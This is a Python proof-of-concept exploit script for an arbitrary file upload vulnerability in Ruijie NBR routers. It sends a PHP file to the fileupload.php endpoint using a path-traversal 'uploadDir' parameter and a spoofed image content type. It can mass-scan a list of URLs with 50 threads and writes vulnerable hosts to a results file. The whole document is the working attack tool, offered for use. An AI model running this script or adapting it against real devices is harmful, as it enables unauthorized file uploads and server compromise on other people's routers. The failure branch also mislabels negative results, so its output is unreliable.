#锐捷 NBR 路由器任意文件上传漏洞
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """


██████╗ ██╗   ██╗██╗     ██╗██╗███████╗    ███╗   ██╗██████╗ ██████╗       ██████╗  ██████╗ ██╗   ██╗████████╗███████╗██████╗ 
██╔══██╗██║   ██║██║     ██║██║██╔════╝    ████╗  ██║██╔══██╗██╔══██╗      ██╔══██╗██╔═══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗
██████╔╝██║   ██║██║     ██║██║█████╗█████╗██╔██╗ ██║██████╔╝██████╔╝█████╗██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██████╔╝
██╔══██╗██║   ██║██║██   ██║██║██╔══╝╚════╝██║╚██╗██║██╔══██╗██╔══██╗╚════╝██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██╔══██╗
██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗    ██║ ╚████║██████╔╝██║  ██║      ██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██║  ██║
╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝    ╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝      ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                                                                                              
                                                     author:zm
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="This is Ruijie NBR router arbitrary file upload vulnerability")
    parser.add_argument('-u','-url',dest='url',type=str,help="Please input your URL")
    parser.add_argument('-f','-file',dest='file',type=str,help="Please input your File path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/ddi/server/fileupload.php?uploadDir=../../321&name=123.php"
    headers = {
        'Accept': 'text/plain, */*; q=0.01',
        'Content-Disposition': 'form-data; name="file"; filename="111.php"',
        'Content-Type': 'image/jpeg',
    }
    data = "<?php phpinfo();?>"
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=10)
        if res1.status_code == 200 and 'jsonrpc' in res1.text:
            print(f"[+]{target} have loophole “{target+payload}”")
            with open ('result.txt','a',encoding='utf-8') as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target} have loophole")
    except:
        pass

if __name__ == "__main__":
    main()